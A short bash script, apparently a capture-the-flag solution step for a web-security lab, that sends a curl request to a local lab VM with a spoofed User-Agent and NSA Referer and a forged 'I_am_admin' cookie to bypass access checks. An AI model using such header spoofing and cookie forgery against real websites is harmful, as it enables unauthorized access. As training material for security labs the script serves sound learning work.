#!/bin/bash
curl 'http://192.168.99.100/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c' \
	-H 'Connection: keep-alive' \
	-H 'Pragma: no-cache' \
	-H 'Cache-Control: no-cache' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'User-Agent: ft_bornToSec' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' \
	-H 'Referer: https://www.nsa.gov/' \
	-H 'Accept-Encoding: gzip, deflate' \
	-H 'Accept-Language: en-US,en;q=0.9' \
	-H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' --compressed \
    -o step_2.html


